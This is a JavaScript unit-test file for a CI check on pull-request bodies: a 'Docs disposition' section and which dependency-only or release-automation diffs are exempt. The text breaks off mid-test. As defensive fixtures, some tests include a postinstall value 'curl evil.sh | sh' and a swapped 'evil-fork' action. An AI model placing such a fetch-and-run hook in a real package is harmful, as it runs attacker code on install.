/**
 * check-docs-disposition.test.js — Unit tests for the PR-body section format
 * check (scripts/check-docs-disposition.js) that gates CI. Every PR carries a
 * "## Docs disposition" section (one line per governing doc, plus one per
 * judgment-only clause) and a "## Change record"; these tests prove the red
 * paths fire (missing/unexpected/duplicate/malformed lines, missing sections
 * and markers), that the shipped PR template's HTML comments are inert in both
 * directions, and that each declared class is exactly as narrow as documented:
 * the dependency-only class (the manifests' dependency-resolution fields and
 * same-action pin bumps), the release-automation class (the pipeline's own
 * branch plus the release-output surface), and the governance-data-only class
 * (one recorded line replacing the per-doc wall, unearned anywhere else).
 */

import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { readFileSync, mkdtempSync, mkdirSync, writeFileSync, rmSync } from 'node:fs';
import { execFileSync, spawnSync } from 'node:child_process';
import os from 'node:os';
import path from 'node:path';
import {
  changedLines,
  isPinOnlyWorkflowDiff,
  isDependencyOnlyPackageJsonDiff,
  isDependencyOnlyCargoTomlDiff,
  PACKAGE_JSON_DEPENDENCY_FIELDS,
  isDependencyOnlyDiff,
  isReleaseAutomationDiff,
  isGovernanceDataDiff,
  exemptionClass,
  DEPENDENCY_ONLY_CLASS,
  RELEASE_AUTOMATION_CLASS,
  GOVERNANCE_MARKER,
  REGISTRY_PATH,
  isExemptDiff,
  docsInScope,
  expectedDispositionLines,
  parseDispositionSection,
  parseGovernanceSection,
  stripHtmlComments,
  extractSection,
  auditBody,
} from '../../../../scripts/check-docs-disposition.js';
import { MAP_PATH } from '../../../../scripts/check-area-map.js';
import { AUTOMATED_BRANCH } from '../../../../scripts/check-no-release-outputs.js';

const MAP = {
  description: 'test map',
  'repo-wide': { description: 'x', docs: ['README.md', 'docs/hub.md'] },
  areas: {
    alpha: { code: ['packages/alpha/**'], docs: ['docs/alpha.md', 'docs/hub.md'] },
    tooling: { code: ['scripts/**'], docs: ['docs/tooling.md'] },
  },
  unassigned: [],
  'declared-governance': [],
  'governance-partitions': [],
};

const REGISTRY = {
  description: 'test registry',
  prefixes: { AL: 'docs/alpha.md' },
  retired: { AL: [] },
  clauses: [
    { doc: 'docs/alpha.md', clause: 'AL-1', tag: 'judgment-only', justification: 'x' },
    { doc: 'docs/alpha.md', clause: 'AL-2', tag: 'check-exists', 'check-ref': 'scripts/x.js' },
    { doc: 'docs/alpha.md', clause: 'AL-3', tag: 'judgment-only', justification: 'y' },
  ],
};

const noContent = () => null;

const SHA_A = 'a'.repeat(40);
const SHA_B = 'b'.repeat(40);

/** Minimal unified diff: context lines prefixed ' ', changes '+'/'-'. */
const diff = (lines) => ['--- a/f', '+++ b/f', '@@ -1 +1 @@', ...lines].join('\n');

/**
 * Full-file unified diff between two package.json texts, as a delete-all /
 * add-all hunk — a valid unified diff that, like the caller's full-context
 * `git diff -U<huge>`, carries both complete sides.
 */
const jdiffText = (beforeText, afterText) =>
  [
    '--- a/package.json',
    '+++ b/package.json',
    '@@ -1 +1 @@',
    ...beforeText.split('\n').map((l) => `-${l}`),
    ...afterText.split('\n').map((l) => `+${l}`),
  ].join('\n');

/** Full-file unified diff between two package.json objects. */
const jdiff = (before, after) =>
  jdiffText(JSON.stringify(before, null, 2), JSON.stringify(after, null, 2));

/** A realistic manifest touching every boundary the exemption must hold. */
const BASE_PKG = {
  name: 'fixture',
  version: '1.0.0',
  private: true,
  engines: { node: '>=24' },
  keywords: ['fixture'],
  scripts: { build: 'x' },
  overrides: { 'js-yaml': '^4.2.0', qs: '^6.15.2' },
  devDependencies: { 'left-pad': '^1.0.0' },
};

/** BASE_PKG with top-level fields replaced (shallow). */
const pkgWith = (patch) => ({ ...structuredClone(BASE_PKG), ...patch });

/** The check CLI, driven end to end by the throwaway-repo harness below. */
const SCRIPT = path.resolve(import.meta.dirname, '../../../../scripts/check-docs-disposition.js');

/**
 * Commit `files` in a throwaway git repo, commit the changed versions over
 * them, and run the check CLI against that diff with the given env.
 * @returns {{ status: number | null, stdout: string, stderr: string }}
 */
const runCheckOnChange = (before, after, env) => {
  const tmp = mkdtempSync(path.join(os.tmpdir(), 'ddisp-rel-'));
  try {
    const g = (args) => execFileSync('git', args, { cwd: tmp, encoding: 'utf8' });
    const write = (files) => {
      for (const [rel, text] of Object.entries(files)) {
        const p = path.join(tmp, rel);
        mkdirSync(path.dirname(p), { recursive: true });
        writeFileSync(p, text);
      }
      g(['add', '.']);
    };
    g(['init', '-q', '-b', 'main']);
    g(['config', 'user.email', 't@example.com']);
    g(['config', 'user.name', 'Test']);
    write(before);
    g(['commit', '-qm', 'base']);
    const base = g(['rev-parse', 'HEAD']).trim();
    write(after);
    g(['commit', '-qm', 'change']);
    return spawnSync('node', [SCRIPT, base], {
      cwd: tmp,
      env: { ...process.env, ...env },
      encoding: 'utf8',
    });
  } finally {
    rmSync(tmp, { recursive: true, force: true });
  }
};

describe('changedLines', () => {
  it('keeps content that begins with + or - at column 0, drops only file headers', () => {
    const text = diff(['+- a yaml list item', '-removed', ' context']);
    assert.deepEqual(changedLines(text), ['- a yaml list item', 'removed']);
  });
});

describe('isPinOnlyWorkflowDiff — the pin-bump exemption has teeth', () => {
  it('accepts a same-action SHA bump', () => {
    const text = diff([
      `-      - uses: actions/checkout@${SHA_A} # v6`,
      `+      - uses: actions/checkout@${SHA_B} # v7`,
    ]);
    assert.equal(isPinOnlyWorkflowDiff(text), true);
  });

  it('rejects an action identity swap even when both lines are pin-shaped', () => {
    const text = diff([
      `-      - uses: actions/checkout@${SHA_A} # v6`,
      `+      - uses: evil-fork/checkout@${SHA_B} # v6`,
    ]);
    assert.equal(isPinOnlyWorkflowDiff(text), false);
  });

  it('rejects short pins, non-pin lines, and rider content starting with -', () => {
    assert.equal(
      isPinOnlyWorkflowDiff(
        diff([`-      - uses: a/b@${'a'.repeat(7)}`, `+      - uses: a/b@${'b'.repeat(7)}`]),
      ),
      false,
    );
    assert.equal(isPinOnlyWorkflowDiff(diff([`+        run: npm run lint`])), false);
    const rider = diff([
      `-      - uses: actions/checkout@${SHA_A}`,
      `+      - uses: actions/checkout@${SHA_B}`,
      '+- a column-zero rider line',
    ]);
    assert.equal(isPinOnlyWorkflowDiff(rider), false);
  });

  it('rejects an empty diff', () => {
    assert.equal(isPinOnlyWorkflowDiff(diff([' unchanged'])), false);
  });
});

describe('isDependencyOnlyPackageJsonDiff — structural and field-aware', () => {
  it('accepts a version bump inside a dependency block', () => {
    const text = jdiff(BASE_PKG, pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } }));
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('regression_402_nested_override_entries_are_exempt', () => {
    // Regression: PR #402 (scoped minimatch overrides) added NESTED override
    // objects and fell out of the exemption — the then line-based check only
    // accepted flat "name": "range" entries inside a dependency block, so a
    // dependency-resolution-only diff owed the full disposition sections.
    // https://github.com/Arsarneq/docent/pull/402
    // The fixture mirrors that PR's exact package.json hunk shape, context
    // lines included.
    const text = [
      '--- a/package.json',
      '+++ b/package.json',
      '@@ -1 +1 @@',
      ' {',
      '   "name": "fixture",',
      '   "scripts": {',
      '     "build": "x"',
      '   },',
      '   "overrides": {',
      '+    "@npmcli/config": {',
      '+      "minimatch": "^10.0.3"',
      '+    },',
      '     "js-yaml": "^4.2.0",',
      '-    "qs": "^6.15.2"',
      '+    "qs": "^6.15.2",',
      '+    "unified-engine": {',
      '+      "minimatch": "^10.0.3"',
      '+    }',
      '   },',
      '   "devDependencies": {',
      '     "left-pad": "^1.0.0"',
      '   }',
      ' }',
    ].join('\n');
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('accepts nested override entries added, removed, or renamed', () => {
    const nested = pkgWith({
      overrides: { 'js-yaml': '^4.2.0', qs: '^6.15.2', 'unified-engine': { minimatch: '^10.0.3' } },
    });
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, nested)), true);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(nested, BASE_PKG)), true);
    const renamed = pkgWith({
      overrides: { 'js-yaml': '^4.2.0', qs: '^6.15.2', '@npmcli/config': { minimatch: '^10.0.3' } },
    });
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(nested, renamed)), true);
  });

  it('accepts a whole dependency-resolution field added or removed', () => {
    const noOverrides = structuredClone(BASE_PKG);
    delete noOverrides.overrides;
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(noOverrides, BASE_PKG)), true);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, noOverrides)), true);
  });

  it('rejects a change outside the dependency-resolution fields — npm scripts are real changes', () => {
    const text = jdiff(BASE_PKG, pkgWith({ scripts: { build: 'echo skipped' } }));
    assert.equal(isDependencyOnlyPackageJsonDiff(text), false);
  });

  it('rejects a diff touching both a dependency field AND another field', () => {
    const both = pkgWith({
      devDependencies: { 'left-pad': '^1.3.0' },
      scripts: { build: 'x', postinstall: 'curl evil.sh | sh' },
    });
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, both)), false);
  });

  it('rejects engines, packageManager, and version changes — toolchain and release contracts, not resolution data', () => {
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ engines: { node: '>=26' } }))),
      false,
    );
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ packageManager: 'npm@11.0.0' }))),
      false,
    );
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ version: '1.0.1' }))),
      false,
    );
  });

  it('rejects array-field changes, including an array/object shape change', () => {
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ keywords: ['fixture', 'x'] }))),
      false,
    );
    assert.equal(
      isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, pkgWith({ keywords: { fixture: true } }))),
      false,
    );
  });

  it('accepts key reordering and formatting-only diffs — the parsed manifest is identical', () => {
    // Reorder: same fields, different insertion order (JSON.stringify keeps it).
    const reordered = {
      version: BASE_PKG.version,
      name: BASE_PKG.name,
      scripts: BASE_PKG.scripts,
      engines: BASE_PKG.engines,
      keywords: BASE_PKG.keywords,
      private: BASE_PKG.private,
      devDependencies: BASE_PKG.devDependencies,
      overrides: BASE_PKG.overrides,
    };
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiff(BASE_PKG, reordered)), true);
    // Whitespace only: 2-space vs 4-space indentation.
    const wsOnly = jdiffText(JSON.stringify(BASE_PKG, null, 2), JSON.stringify(BASE_PKG, null, 4));
    assert.equal(isDependencyOnlyPackageJsonDiff(wsOnly), true);
  });

  it('tolerates the no-newline-at-end-of-file marker', () => {
    const text =
      jdiff(BASE_PKG, pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } })) +
      '\n\\ No newline at end of file';
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('fails closed on a partial-context fragment — even with the block opener visible (why the caller supplies full context)', () => {
    // Neither fragment parses as JSON, so neither can prove the change stays
    // inside dependency-resolution fields; both are non-exempt.
    const withOpener = diff([
      '   "devDependencies": {',
      '-    "left-pad": "^1.0.0",',
      '+    "left-pad": "^1.3.0",',
      '     "z": "^1.0.0"',
      '   }',
    ]);
    assert.equal(isDependencyOnlyPackageJsonDiff(withOpener), false);
    const openerDropped = diff([
      '-    "left-pad": "^1.0.0",',
      '+    "left-pad": "^1.3.0",',
      '     "z": "^1.0.0"',
    ]);
    assert.equal(isDependencyOnlyPackageJsonDiff(openerDropped), false);
  });

  it('fails closed on non-object JSON and on an empty diff', () => {
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText('[1]', '[1, 2]')), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(diff([' unchanged'])), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(''), false);
  });

  it('regression: a "__proto__" member added or removed never rides the exemption', () => {
    // A plain a[f] read on the side missing the member resolves "__proto__"
    // through the prototype chain to Object.prototype, which deep-equals {} —
    // so the {} value is the case that would slip without own-property reads
    // ({"x": 1} walls either way).
    const before = JSON.stringify(BASE_PKG, null, 2);
    const inject = (value) =>
      before.replace('"name": "fixture",', `"name": "fixture",\n  "__proto__": ${value},`);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(before, inject('{}'))), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(inject('{}'), before)), false);
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(before, inject('{ "x": 1 }'))), false);
    // Present and identical on both sides: inert, a dep bump stays exempt.
    const bumped = JSON.stringify(
      pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } }),
      null,
      2,
    ).replace('"name": "fixture",', '"name": "fixture",\n  "__proto__": {},');
    assert.equal(isDependencyOnlyPackageJsonDiff(jdiffText(inject('{}'), bumped)), true);
  });

  it('accepts CRLF manifest content — the carriage returns are inter-token whitespace', () => {
    const crlf = (obj) => JSON.stringify(obj, null, 2).replace(/\n/g, '\r\n');
    const text = jdiffText(
      crlf(BASE_PKG),
      crlf(pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } })),
    );
    assert.equal(isDependencyOnlyPackageJsonDiff(text), true);
  });

  it('fails closed on a byte-order mark — the side does not parse', () => {
    const bom = (obj) => '\uFEFF' + JSON.stringify(obj, null, 2);
    const text = jdiffText(
      bom(BASE_PKG),
      bom(pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } })),
    );
    assert.equal(isDependencyOnlyPackageJsonDiff(text), false);
  });

  it('fails closed on a file-creation diff — the empty before side does not parse', () => {
    const created = [
      '--- /dev/null',
      '+++ b/package.json',
      '@@ -0,0 +1 @@',
      ...JSON.stringify(BASE_PKG, null, 2)
        .split('\n')
        .map((l) => `+${l}`),
    ].join('\n');
    assert.equal(isDependencyOnlyPackageJsonDiff(created), false);
  });
});

describe('the exemption declaration — welded to its doctrine home', () => {
  /**
   * CONTRIBUTING's exemption paragraph, scoped to its own extent (the anchor
   * sentence through the next blank line) — the same scope both welds use, so
   * a declaration that loses a term cannot stay green off the same token
   * elsewhere in the file.
   */
  const exemptionParagraph = () => {
    const contributing = readFileSync(
      path.resolve(import.meta.dirname, '../../../../.github/CONTRIBUTING.md'),
      'utf8',
    );
    const anchor = 'Dependency-only PRs skip both sections';
    const start = contributing.indexOf(anchor);
    assert.notEqual(start, -1, `CONTRIBUTING.md must carry the "${anchor}" exemption paragraph`);
    const rest = contributing.slice(start);
    const end = rest.indexOf('\n\n');
    return end === -1 ? rest : rest.slice(0, end);
  };

  it('cites the release-output surface’s one home rather than restating its members', () => {
    // The release-automation class admits a PR by that enumeration, which is
    // documented as expected to grow — so the doctrine points at its home and
    // the pointer itself is welded, inside the same paragraph extent.
    assert.match(
      exemptionParagraph(),
      /scripts\/check-no-release-outputs\.js/,
      "CONTRIBUTING.md's exemption paragraph must cite scripts/check-no-release-outputs.js",
    );
  });

  it('every exempt field is named in CONTRIBUTING.md’s exemption paragraph', () => {
    // The boundary is declared in two homes — this exported list (the code the
    // gate runs) and the exemption paragraph in CONTRIBUTING's "Docs
    // Disposition and Change Record" section (the doctrine contributors read).
    // Weld them so they cannot drift apart silently — scoped to that
    // paragraph's extent, so a field dropped from the declaration cannot stay
    // green off the same token elsewhere in the file (e.g. `dependencies` in
    // setup prose).
    const paragraph = exemptionParagraph();
    for (const field of PACKAGE_JSON_DEPENDENCY_FIELDS) {
      assert.match(
        paragraph,
        new RegExp('`' + field + '`'),
        `CONTRIBUTING.md's exemption paragraph must name \`${field}\``,
      );
    }
  });
});

describe('the governance-data-only marker — welded to the surfaces it is copied from', () => {
  const repoFile = (rel) =>
    readFileSync(path.resolve(import.meta.dirname, '../../../..', rel), 'utf8');

  it('CONTRIBUTING.md shows the marker verbatim in its fenced example', () => {
    // Contributors type the marker exactly as the example spells it, and the
    // parser accepts exactly one spelling — so an example that drifts teaches
    // a line the check reports as malformed.
    const fenced = [...repoFile('.github/CONTRIBUTING.md').matchAll(/```text\n([\s\S]*?)```/g)].map(
      (m) => m[1],
    );
    assert.ok(
      fenced.some((block) => block.trimStart().startsWith(GOVERNANCE_MARKER)),
      `CONTRIBUTING.md must show a fenced example opening with "${GOVERNANCE_MARKER}"`,
    );
  });

  it('the PR template scaffolds the marker verbatim in its Docs disposition comment', () => {
    const section = extractSection(
      repoFile('.github/PULL_REQUEST_TEMPLATE.md'),
      'Docs disposition',
    );
    assert.notEqual(section, null, 'the template must carry a "## Docs disposition" section');
    assert.ok(
      section.includes(GOVERNANCE_MARKER),
      `the PR template's Docs-disposition comment must spell "${GOVERNANCE_MARKER}" verbatim`,
    );
  });
});

describe('isDependencyOnlyCargoTomlDiff', () => {
  it('accepts a bump inside [dependencies] and rejects one outside', () => {
    const inside = diff([' [dependencies]', '-serde = "1.0.0"', '+serde = "1.0.1"']);
    assert.equal(isDependencyOnlyCargoTomlDiff(inside), true);
    const outside = diff([' [package]', '-version = "1.0.0"', '+version = "2.0.0"']);
    assert.equal(isDependencyOnlyCargoTomlDiff(outside), false);
  });

  it('needs the section header in the hunk — a false negative without it (same fix as package.json)', () => {
    const withHeader = diff([
      ' [dependencies]',
      ' serde = "1.0.0"',
      '-tokio = "1.0.0"',
      '+tokio = "1.1.0"',
    ]);
    assert.equal(isDependencyOnlyCargoTomlDiff(withHeader), true);
    const headerDropped = diff([' serde = "1.0.0"', '-tokio = "1.0.0"', '+tokio = "1.1.0"']);
    assert.equal(isDependencyOnlyCargoTomlDiff(headerDropped), false);
  });

  it('accepts every dependency-section form Cargo defines — table, target, workspace', () => {
    // The per-crate table form is how a dependency with options is written, so a
    // bump inside one is the same dependency data as the inline form.
    const bumpIn = (header) => diff([` ${header}`, '-version = "1.0.0"', '+version = "1.0.1"']);
    for (const header of [
      '[dependencies.serde]',
      "[target.'cfg(windows)'.dependencies]",
      '[target.x86_64-pc-windows-msvc.dev-dependencies]',
      '[workspace.dependencies.serde]',
      '[workspace.dependencies]',
      '[build-dependencies.cc]',
    ]) {
      assert.equal(
        isDependencyOnlyCargoTomlDiff(bumpIn(header)),
        true,
        `expected a bump inside ${header} to be dependency-only`,
      );
    }
  });

  it('rejects the open third-party namespaces that merely end in a dependency-shaped name', () => {
    // [package.metadata.*] and [lints.*] hold arbitrary tool data — a change
    // there is a real change, whatever the table happens to be called.
    const changeIn = (header) => diff([` ${header}`, '-x = "1"', '+x = "2"']);
    for (const header of [
      '[package]',
      '[profile.release]',
      '[package.metadata.dependencies]',
      '[package.metadata.docs.rs.dependencies]',
      '[lints.dependencies]',
      '[profile.release.package.dependencies]',
      '[dependencies-extra]',
    ]) {
      assert.equal(
        isDependencyOnlyCargoTomlDiff(changeIn(header)),
        false,
        `expected a change inside ${header} to carry the sections`,
      );
    }
  });
});

describe('isExemptDiff — the declared classes that skip the sections', () => {
  const depBump = jdiff(BASE_PKG, pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } }));
  const pinBump = diff([
    `-      - uses: actions/checkout@${SHA_A}`,
    `+      - uses: actions/checkout@${SHA_B}`,
  ]);

  it('exempts a pure-lockfile diff on its own', () => {
    assert.equal(isExemptDiff({ files: ['package-lock.json'], fileDiff: () => 'anything' }), true);
  });

  it('exempts lockfiles, dependency-field manifest bumps, and pin bumps together', () => {
    const diffs = {
      'package-lock.json': 'anything',
      'packages/extension/package.json': depBump,
      '.github/workflows/test.yml': pinBump,
      'packages/desktop/src-tauri/Cargo.lock': 'anything',
    };
    assert.equal(isExemptDiff({ files: Object.keys(diffs), fileDiff: (f) => diffs[f] }), true);
  });

  it('does not exempt a manifest whose diff leaves the dependency-resolution fields', () => {
    const scripts = jdiff(
      BASE_PKG,
      pkgWith({ scripts: { build: 'x', postinstall: 'curl evil.sh | sh' } }),
    );
    assert.equal(isExemptDiff({ files: ['package.json'], fileDiff: () => scripts }), false);
  });

  it('does not exempt mixed diffs or empty file lists', () => {
    assert.equal(
      isExemptDiff({
        files: ['package-lock.json', 'packages/alpha/index.js'],
        fileDiff: () => depBump,
      }),
      false,
    );
    assert.equal(isExemptDiff({ files: [], fileDiff: () => '' }), false);
  });

  it('names the admitting class, keeping the dependency classes under one name', () => {
    assert.equal(
      exemptionClass({ files: ['package-lock.json'], fileDiff: () => 'anything' }),
      DEPENDENCY_ONLY_CLASS,
    );
    assert.equal(
      exemptionClass({
        files: ['README.md'],
        fileDiff: () => '',
        headRef: AUTOMATED_BRANCH,
      }),
      RELEASE_AUTOMATION_CLASS,
    );
    assert.equal(exemptionClass({ files: ['packages/alpha/index.js'], fileDiff: () => '' }), null);
  });
});

describe('isReleaseAutomationDiff — the release pipeline’s own regeneration PR', () => {
  // Release outputs, including a leaf delta file (the version the pipeline bumps).
  const RELEASE_FILES = [
    'schemas/dist/extension.schema.json',
    'schemas/extension.delta.json',
    'README.md',
    'docs/technical/session-format.md',
    'packages/extension/manifest.json',
  ];

  it('admits the automation branch when every changed file is a release output', () => {
    assert.equal(
      isReleaseAutomationDiff({ files: RELEASE_FILES, headRef: AUTOMATED_BRANCH }),
      true,
    );
    assert.equal(
      isExemptDiff({ files: RELEASE_FILES, fileDiff: () => '', headRef: AUTOMATED_BRANCH }),
      true,
    );
  });

  it('admits nothing when the head ref is another branch, or is not supplied at all', () => {
    // The workflow supplies the head ref for same-repo PRs only, so a fork PR
    // arrives here with the empty string — and existing callers pass none.
    assert.equal(isReleaseAutomationDiff({ files: RELEASE_FILES, headRef: 'feature/x' }), false);
    assert.equal(isReleaseAutomationDiff({ files: RELEASE_FILES, headRef: '' }), false);
    assert.equal(isExemptDiff({ files: RELEASE_FILES, fileDiff: () => '' }), false);
  });

  it('rejects a file outside the release-output surface riding along on that branch', () => {
    assert.equal(
      isReleaseAutomationDiff({
        files: [...RELEASE_FILES, 'packages/extension/background/worker.js'],
        headRef: AUTOMATED_BRANCH,
      }),
      false,
    );
  });

  it('rejects an empty file list', () => {
    assert.equal(isReleaseAutomationDiff({ files: [], headRef: AUTOMATED_BRANCH }), false);
  });

  it('leaves the dependency class deciding from the diff alone, head ref or not', () => {
    const depBump = jdiff(BASE_PKG, pkgWith({ devDependencies: { 'left-pad': '^1.3.0' } }));
    assert.equal(isDependencyOnlyDiff({ files: ['package.json'], fileDiff: () => depBump }), true);
    assert.equal(
      exemptionClass({
        files: ['package.json'],
        fileDiff: () => depBump,
        headRef: AUTOMATED_BRANCH,
      }),
      DEPENDENCY_ONLY_CLASS,
    );
  });
});

describe('run() manifest exemption — full-file context so the block opener is never dropped', () => {
  // Regression: the disposition gate demanded sections for a pure dependabot
  // devDependency bump because git's default 3-line context drops the
  // "devDependencies": {" opener when the changed entry sits more than a few lines
  // below it, so isDependencyOnlyPackageJsonDiff misjudged it as a change outside a
  // dependency block. Dependabot cannot add the demanded sections.
  // Surfaced by https://github.com/Arsarneq/docent/pull/268

  /**
   * A package.json whose bumped devDependency sits many lines below the block
   * opener — deep enough that any realistic reduction of the diff context (not
   * just the default 3) would drop the opener and reintroduce the bug.
   */
  const pkg = (ver) => {
    const devDependencies = {};
    for (let i = 0; i < 24; i++) devDependencies[`filler-${String(i).padStart(2, '0')}`] = '^1.0.0';
    devDependencies['markdownlint-cli2'] = ver;
    devDependencies['z-last'] = '^1.0.0';
    return (
      JSON.stringify(
        {
          name: 'fixture',
          version: '1.0.0',
          private: true,
          scripts: { build: 'x' },
          devDependencies,
        },
        null,
        2,
      ) + '\n'
    );
  };

  /**
   * Commit `beforeText` as package.json in a throwaway git repo, commit
   * `afterText` over it, and run the check CLI against that one-file diff with
   * an empty PR body (exempt diffs must pass with no disposition sections).
   * @returns {{ status: number | null, stdout: string, stderr: string }}
   */
  const runCheckOnManifestChange = (beforeText, afterText) => {
    const tmp = mkdtempSync(path.join(os.tmpdir(), 'ddisp-'));
    try {
      const g = (args) => execFileSync('git', args, { cwd: tmp, encoding: 'utf8' });
      g(['init', '-q', '-b', 'main']);
      g(['config', 'user.email', 't@example.com']);
      g(['config', 'user.name', 'Test']);
      writeFileSync(path.join(tmp, 'package.json'), beforeText);
      g(['add', '.']);
      g(['commit', '-qm', 'base']);
      const base = g(['rev-parse', 'HEAD']).trim();
      writeFileSync(path.join(tmp, 'package.json'), afterText);
      g(['add', '.']);
      g(['commit', '-qm', 'change']);
      return spawnSync('node', [SCRIPT, base], {
        cwd: tmp,
        env: { ...process.env, PR_BODY: '' },
        encoding: 'utf8',
      });
    } finally {
      rmSync(tmp, { recursive: true, force: true });
    }
  };

  it('regression_268_dep_bump_far_below_block_opener_is_exempt', () => {
    const r = runCheckOnManifestChange(pkg('^0.22.1'), pkg('^0.23.0'));
    assert.equal(
      r.status,
      0,
      `expected the dependency bump to be exempt (exit 0), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stdout, /dependency-only/);
  });

  it('regression_402_nested_override_diff_is_exempt_end_to_end', () => {
    // Regression: PR #402 scoped two minimatch overrides to their dependents —
    // nested override objects, pure dependency-resolution data — and the gate
    // demanded the full disposition sections anyway (the then line-based
    // exemption accepted only flat "name": "range" entries inside a block).
    // https://github.com/Arsarneq/docent/pull/402
    const manifest = (overrides) =>
      JSON.stringify(
        { name: 'fixture', version: '1.0.0', private: true, scripts: { build: 'x' }, overrides },
        null,
        2,
      ) + '\n';
    const r = runCheckOnManifestChange(
      manifest({ 'js-yaml': '^4.2.0', qs: '^6.15.2' }),
      manifest({
        '@npmcli/config': { minimatch: '^10.0.3' },
        'js-yaml': '^4.2.0',
        qs: '^6.15.2',
        'unified-engine': { minimatch: '^10.0.3' },
      }),
    );
    assert.equal(
      r.status,
      0,
      `expected the nested-override diff to be exempt (exit 0), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stdout, /dependency-only/);
  });
});

describe('run() release-automation class — the generated PR body carries no sections', () => {
  const REPO = path.resolve(import.meta.dirname, '../../../..');

  /**
   * The body a publish workflow generates for its automation PR.
   * @param {string} [workflowFile] repo-relative workflow path
   */
  const generatedBody = (workflowFile = '.github/workflows/publish.yml') => {
    const workflow = readFileSync(path.join(REPO, workflowFile), 'utf8');
    const m = workflow.match(/^\s*body: '(.*)'$/m);
    assert.notEqual(
      m,
      null,
      `${workflowFile} must state the automation PR body as a single-quoted scalar`,
    );
    return m[1];
  };

  const before = {
    'README.md': '| Chrome Extension | 3.0.0 |\n',
    'schemas/extension.delta.json': '{\n  "version": "3.0.0"\n}\n',
    'schemas/dist/extension.schema.json': '{\n  "x": 1\n}\n',
    // Governance data the non-exempt path reads; unchanged between the two
    // commits, so it never enters the diff under test. The map is shape-valid —
    // the check compiles it before resolving scope — and its one area owns a
    // tree none of these files sit in, so the scope stays the edited repo-wide
    // README line alone.
    [MAP_PATH]: JSON.stringify({
      description: 'fixture map',
      'repo-wide': { description: 'x', docs: ['README.md'] },
      areas: { unrelated: { code: ['packages/unrelated/**'], docs: ['docs/unrelated.md'] } },
      unassigned: [],
      'declared-governance': [],
      'governance-partitions': [],
    }),
    [REGISTRY_PATH]: JSON.stringify({
      description: 'fixture registry',
      prefixes: {},
      retired: {},
      clauses: [],
    }),
  };
  const after = {
    'README.md': '| Chrome Extension | 3.1.0 |\n',
    'schemas/extension.delta.json': '{\n  "version": "3.1.0"\n}\n',
    'schemas/dist/extension.schema.json': '{\n  "x": 2\n}\n',
  };

  it('exits 0 on a release-output-only diff carried by the automation head ref', () => {
    const r = runCheckOnChange(before, after, {
      PR_BODY: generatedBody(),
      PR_HEAD_REF: AUTOMATED_BRANCH,
    });
    assert.equal(
      r.status,
      0,
      `expected the release-automation diff to be admitted (exit 0), got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    assert.match(r.stdout, /release-automation/);
  });

  it('exits 1 on the same diff without the head ref — the class is never decided from the diff alone', () => {
    const r = runCheckOnChange(before, after, { PR_BODY: generatedBody(), PR_HEAD_REF: '' });
    assert.equal(
      r.status,
      1,
      `expected the same diff to owe the sections without the head ref, got exit ${r.status}.\n` +
        `stdout: ${r.stdout}\nstderr: ${r.stderr}`,
    );
    // The red is the disposition verdict itself, not a crash on the way to it.
    assert.match(r.stderr, /missing PR-body section\(s\)/);
  });

  it('both publish workflows generate the same automation PR body', () => {
    // One branch, one PR body: whichever pipeline opens the version PR, the
    // body a reader finds there says the same thing about why it carries no
    // sections. Byte equality, so a sentence added to one and not the other
    // reds here rather than shipping as a per-platform difference.
    assert.equal(generatedBody('.github/workflows/publish-desktop.yml'), generatedBody());
  });
});

describe('docsInScope', () => {
  it('collects the resolved areas doc sets for changed code', () => {
    assert.deepEqual(
      docsInScope({ files: ['packages/alpha/x.js'], map: MAP, readFile: noContent }),
      ['docs/alpha.md', 'docs/hub.md'],
    );
  });

  it('includes an edited repo-wide doc that belongs to no doc set', () => {
    assert.deepEqual(docsInScope({ files: ['README.md'], map: MAP, readFile: noContent }), [
      'README.md',
    ]);
  });

  it('routes a repo-wide doc that sits in a doc set through its areas (no self-duplication)', () => {
    assert.deepEqual(docsInScope({ files: ['docs/hub.md'], map: MAP, readFile: noContent }), [
      'docs/alpha.md',
      'docs/hub.md',
    ]);
  });

  it('resolves via a pointer comment when file content names a governing doc', () => {
    assert.deepEqual(
      docsInScope({ files: ['tools/free.rs'], map: MAP, readFile: () => '// see docs/alpha.md' }),
      ['docs/alpha.md', 'docs/hub.md'],
    );
  });

  it('a declared-governance file resolves to its governed-by, overriding its area docs', () => {
    // scripts/gen.js is code-owned by tooling (→ docs/tooling.md) but declared governed by docs/alpha.md.
    const map = {
      ...MAP,
      'declared-governance': [
        { path: 'scripts/gen.js', reason: 'x', 'governed-by': ['docs/alpha.md'] },
      ],
    };
